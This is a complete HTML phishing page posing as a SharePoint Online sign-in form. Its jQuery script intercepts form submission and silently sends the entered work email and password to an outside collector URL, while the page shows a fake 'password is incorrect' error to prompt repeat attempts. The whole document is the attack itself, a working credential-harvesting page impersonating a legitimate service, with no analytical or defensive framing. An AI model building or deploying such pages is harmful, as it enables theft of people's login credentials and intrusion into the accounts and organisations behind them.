<!DOCTYPE html>
<html><head><title>Sign in | SharePoint Online</title></head>
<body>
<form id="login" method="post" action="">
<label>Work email <input type="email" name="username"></label>
<label>Password <input type="password" name="password"></label>
<button type="submit">Sign in</button>
</form>
<p class="err">The password is incorrect. Please try again.</p>
<script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
<script>
$('#login').on('submit', function(e) {
  e.preventDefault();
  $.ajax({
    url: "https://collector.example.invalid/sp/log.php",
    type: "POST",
    data: { u: $('input[name=username]').val(), p: $('input[name=password]').val() }
  });
});
</script>
</body></html>
